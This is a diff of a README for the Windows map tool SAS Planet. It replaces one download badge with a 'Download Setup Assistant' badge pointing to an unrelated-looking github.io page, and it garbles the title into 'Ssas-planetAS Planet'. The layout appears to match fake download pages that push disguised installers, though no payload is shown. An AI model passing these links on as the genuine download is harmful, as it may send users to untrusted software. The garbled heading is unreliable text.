@@ -2,15 +2,9 @@
   <img src="https://softik.top/wp-content/uploads/ikonka-sas-planeta.webp" alt="SAS Planet Banner" width="40%" />
 </p>
 
-<h1 align="center">🛰️ SAS Planet (Windows)</h1>
+<h1 align="center">🛰️ Ssas-planetAS Planet (Windows)</h1>
 
-<p align="center">
-  <a href="https://sas-planet-free-tool-pc.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20SAS%20Planet-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download SAS Planet for Windows" 
-         style="width: 540px; height: 43px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://klaarameonne.github.io/.github/sas-planet)
 
 ---
 
